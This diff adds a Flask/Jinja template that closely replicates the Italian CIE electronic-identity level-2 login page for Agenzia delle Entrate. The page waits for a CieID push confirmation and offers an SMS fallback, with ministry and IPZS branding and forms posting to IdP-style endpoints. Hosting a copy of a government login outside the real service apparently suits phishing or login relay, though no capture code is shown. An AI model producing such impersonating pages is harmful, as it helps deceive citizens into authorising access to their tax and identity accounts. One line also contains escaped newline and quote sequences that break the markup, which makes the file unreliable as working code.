@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html class="h-100" lang="it">
+    <head>
+        <title>CIE Login - attesa conferma</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <link rel="stylesheet" href="{{ url_for('static', filename='cie/css/bootstrap-italia.min.css') }}">
+        <link rel="stylesheet" href="{{ url_for('static', filename='cie/css/l12.css') }}?202603172014">
+        <link rel="apple-touch-icon" sizes="57x57" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-57x57.png') }}">
+        <link rel="apple-touch-icon" sizes="60x60" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-60x60.png') }}">
+        <link rel="apple-touch-icon" sizes="72x72" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-72x72.png') }}">
+        <link rel="apple-touch-icon" sizes="76x76" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-76x76.png') }}">
+        <link rel="apple-touch-icon" sizes="114x114" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-114x114.png') }}">
+        <link rel="apple-touch-icon" sizes="120x120" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-120x120.png') }}">
+        <link rel="apple-touch-icon" sizes="144x144" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-144x144.png') }}">
+        <link rel="apple-touch-icon" sizes="152x152" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-152x152.png') }}">
+        <link rel="apple-touch-icon" sizes="180x180" href="{{ url_for('static', filename='cie/images/favicon/apple-touch-icon-180x180.png') }}">
+        <link rel="icon" type="image/png" sizes="32x32" href="{{ url_for('static', filename='cie/images/favicon/favicon-32x32.png') }}">
+        <link rel="icon" type="image/png" sizes="192x192" href="{{ url_for('static', filename='cie/images/favicon/android-chrome-192x192.png') }}">
+        <script src="{{ url_for('static', filename='cie/js/bootstrap-italia.bundle.min.js') }}"></script>
+        <style>
+            /* Titillium+Web:300,400,600,700 */
+
+            /* latin-ext */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 300;
+                src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 300;
+                src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+            /* latin-ext */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+            /* latin-ext */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 600;
+                src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 600;
+                src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+            /* latin-ext */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Titillium Web';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
+                    url(/cie/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+
+            /* Lora:400,700 */
+
+            /* latin-ext */
+            @font-face {
+                font-family: 'Lora';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Lora Regular'), local('Lora-Regular'),
+                    url(/cie/fonts/Lora/Lora-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Lora/Lora-Regular.woff) format('woff'),
+                    url(/cie/fonts/Lora/Lora-Regular.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Lora';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Lora Regular'), local('Lora-Regular'),
+                    url(/cie/fonts/Lora/Lora-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Lora/Lora-Regular.woff) format('woff'),
+                    url(/cie/fonts/Lora/Lora-Regular.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+
+            /* latin-ext */
+            @font-face {
+                font-family: 'Lora';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Lora Bold'), local('Lora-Bold'),
+                    url(/cie/fonts/Lora/Lora-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Lora/Lora-Bold.woff) format('woff'),
+                    url(/cie/fonts/Lora/Lora-Bold.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Lora';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Lora Bold'), local('Lora-Bold'),
+                    url(/cie/fonts/Lora/Lora-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Lora/Lora-Bold.woff) format('woff'),
+                    url(/cie/fonts/Lora/Lora-Bold.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+
+            /* Roboto+Mono:400,700 */
+
+            /* latin-ext */
+            @font-face {
+                font-family: 'Roboto Mono';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Roboto Mono'), local('RobotoMono-Regular'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Roboto Mono';
+                font-style: normal;
+                font-weight: 400;
+                src: local('Roboto Mono'), local('RobotoMono-Regular'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+
+            /* latin-ext */
+            @font-face {
+                font-family: 'Roboto Mono';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
+                unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+            }
+
+            /* latin */
+            @font-face {
+                font-family: 'Roboto Mono';
+                font-style: normal;
+                font-weight: 700;
+                src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
+                    url(/cie/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
+                unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+            }
+        </style>
+        <script src="{{ url_for('static', filename='cie/js/l12.js.jsp') }}?202603172014"></script>
+        <script src="{{ url_for('static', filename='cie/js/is.js') }}?202603172014"></script>
+    </head>
+    <body class="d-flex flex-column h-100">
+        <!-- header -->
+        <div id="wrapperL12-header" class="it-header-wrapper ipzs-bb py-2">
+            <div class="it-header-slim-wrapper">
+                <div class="container">
+                    <div class="row it-header-slim-wrapper-content">
+                        <div class="col">
+                            <img src="{{ url_for('static', filename='cie/images/ministero@2x.png') }}" alt="Ministero dell'Interno">
+                        </div>
+                        <div class="col-1 text-right">
+                            <!-- lang -->
+                            <div class="it-header-slim-right-zone">
+                                <div class="menu-wrapper" id="switchLang">
+                                    <ul class="navbar-nav">
+                                        <li class="nav-item dropdown">
+                                            <a class="nav-link dropdown-toggle" href="#" role="button" id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false" aria-haspopup="true">
+                                                <span class="sr-only">Selezione lingua: lingua selezionata</span>
+                                                <span> ITA </span>
+                                                <svg class="icon-expand  icon icon-xs"><use href="{{ url_for('static', filename='cie/images/sprite.svg') }}#it-expand"></use></svg>
+                                            </a>
+                                            <div class="dropdown-menu" role="region" aria-labelledby="eccLangNavDropdown">
+                                                <div class="link-list-wrapper">
+                                                    <ul class="link-list">
+                                                        <li><a id="switch2it" class="dropdown-item list-item current" href="?eccLang=it"><span>ITA <span class="sr-only">selezionata</span></span></a></li>
+                                                        <li><a id="switch2de" class="dropdown-item list-item" href="?eccLang=de"><span>DEU </span></a></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </div>
+                            <!-- /lang -->
+                        </div>
+                        <div class="col-4 col-lg-1 text-right">
+                            <img src="{{ url_for('static', filename='cie/images/CIE.png') }}" alt="Carta d'identita' elettronica">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /header -->
+        <div id="wrapperL12">
+            <div class="container my-4">
+                <div class="row">
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                    <div class="col">
+                        <div class="row">
+                            <div id="title" class="mb-4 col">
+                                <p class="c1">
+                                    <strong>
+                                        RICHIESTA D'ACCESSO CIE
+                                        LIVELLO 2
+                                    </strong>
+                                </p>
+                                <h1>Agenzia delle Entrate</h1>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                </div>
+                <div class="row">
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                    <div class="col">
+                        <div class="row">
+                            <div class="col-12 col-lg-8">
+                                <h2 class="mb-4">Controlla adesso il tuo cellulare</h2>
+                                <p class="c2">Ti abbiamo inviato una notifica sull'App CieID per autorizzare il tuo accesso.</p>
+                                <div id="postPushLink" style="display: none;">
+                                    <p class="c2"><a href="/idp/login/livello1e2postpush" title="dopo aver confermato dalla app CieID, clicca qui per proseguire">Clicca qui dopo aver confermato la notifica sulla APP</a></p>
+                                </div>
+                            </div>
+                            <div class="col-12 col-lg-4 text-center mb-4 mb-lg-0">
+                                <img class="img-fluid" src="{{ url_for('static', filename='cie/images/push.png') }}" alt="Notifica push" id="pushImg">
+                            </div>
+                        </div>
+                    </div>\n                </div>\n\n                <div class=\"row\">\n                    <div class=\"col\">\n                        <p class=\"font-weight-semibold c2\">Non hai ricevuto la notifica sul tuo cellulare?</p>\n                    </div>\n                </div>
+                    <div class="row">
+                        <div class="col">
+                            <p class="c2 mb-0">
+                                Controlla in App di avere le notifiche abilitate o
+                                &nbsp;<strong id="push" class=""><a id="push_link" href="#">invia una nuova notifica.</a></strong>
+                            </p>
+                            <form method="POST" action="/idp/login/livello2s1b" id="push_form" class="d-inline">
+                                <div class="d-inline">
+                                    <input type="hidden" name="cnl" value="push">
+                                    <script>
+                                        $(document).ready(function() {
+                                            $("#push").html("<a id='push_link' href='#'>invia una nuova notifica.</a>");
+                                            $("#push_link").click(function(e) {
+                                                e.preventDefault();
+                                                $("#push_form").submit();
+                                            });
+                                        });
+                                    </script>
+                                    <noscript>
+                                        <button type="submit" class="btn btn-link">invia una nuova notifica.</button>
+                                    </noscript>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="row d-none d-md-block py-4">
+                        <div class="col">
+                            <div class="row">
+                                <div class="col"><hr></div>
+                                <div class="col mx-n1 mx-lg-n3 align-self-center"><p class="text-center font-weight-bold c3 mb-0">In alternativa</p></div>
+                                <div class="col"><hr></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="row d-none d-md-block">
+                        <div class="col">
+                            <p class="c2">Inquadra il QR Code con l'App CieID.&nbsp;<strong><a href="/idp/login/sessionClosure" title="Vai al QR code">Vai al QR code</a></strong></p>
+                        </div>
+                    </div>
+                    <div class="row d-md-none">
+                        <div class="col pt-4">
+                            <p class="c2"><strong><a href="/idp/login/sessionClosure" id="cancelAndGoQr" title="Annulla e vai al QR code">Annulla</a></strong></p>
+                        </div>
+                    </div>
+                    <script>
+                        checkPushConfirmed();
+                    </script>
+                </div>
+                <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+            </div>
+        </div>
+        <div id="bottomStripWrapper" class="mb-5 bottom-strip">
+            <div class="container">
+                <div class="row">
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                    <div class="col py-4">
+                        <p class="c2 mb-0">
+                            Non puoi utilizzare l'App CieID?
+                            &nbsp;<strong id="sms" class="d-block d-md-inline"><a id="sms_link" href="#">Autorizza tramite SMS</a></strong>
+                        </p>
+                        <form method="POST" action="/idp/login/livello2s1b" id="sms_form" class="d-inline">
+                            <div class="d-inline">
+                                <input type="hidden" name="cnl" value="sms">
+                                <script>
+                                    $(document).ready(function() {
+                                        $("#sms").html("<a id='sms_link' href='#'>Autorizza tramite SMS</a>");
+                                        $("#sms_link").click(function(e) {
+                                            e.preventDefault();
+                                            $("#sms_form").submit();
+                                        });
+                                    });
+                                </script>
+                                <noscript>
+                                    <button type="submit" class="btn btn-link">Autorizza tramite SMS</button>
+                                </noscript>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
+                </div>
+            </div>
+        </div>
+        <!-- footer -->
+        <footer class="it-footer mt-auto">
+            <div class="it-footer-small-prints">
+                <div class="container py-3 text-white px-3 px-md-0">
+                        <div class="col-12 col-lg-3">
+                            <div class="row">
+                                <div class="col-4">
+                                    <p class="mb-3 opacity">progetto di</p>
+                                </div>
+                                <div class="col">
+                                    <img src="{{ url_for('static', filename='cie/images/ministero_white.png') }}" alt="Ministero dell'Interno">
+                                    <img src="{{ url_for('static', filename='cie/images/ipzs.png') }}" alt="Istituto Poligrafico e Zecca dello Stato Italiano" class="mt-2">
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12 col-lg-4 mt-4 mt-md-0 d-none d-sm-flex">
+                            <div class="py-2"></div>
+                            <div id="cieidapp" class="pl-sm-4">
+                                <div class="mb-3"><strong>CieID App</strong></div>
+                                <div class="row">
+                                    <div class="col-3">
+                                        <img src="{{ url_for('static', filename='cie/images/cieid.png') }}" class="img-fluid cieid" alt="Logo App CieID">
+                                    </div>
+                                    <div class="col">
+                                        <p class="mb-1">
+                                            L'app che ti consente di accedere ai servizi in rete utilizzando la tua identità digitale CieID
+                                        </p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-12 col-lg-4 my-auto stores d-none d-sm-flex">
+                            <div class="row">
+                                <div class="col text-right">
+                                    <a href="https://apps.apple.com/it/app/cieid/id1504644677" title="Scarica l'app dallo Store Apple" target="_blank"><img src="{{ url_for('static', filename='cie/images/appstore@2x.png') }}" class="img-fluid" alt="App Store"></a>
+                                </div>
+                                <div class="col">
+                                    <a href="https://play.google.com/store/apps/details?id=it.ipzs.cieid&amp;hl=it" title="Scarica l'app dal Play Store Google" target="_blank"><img src="{{ url_for('static', filename='cie/images/googleplay@2x.png') }}" class="img-fluid" alt="Google Play"></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </footer>
+        <!-- /footer -->
+    </body>
+</html>
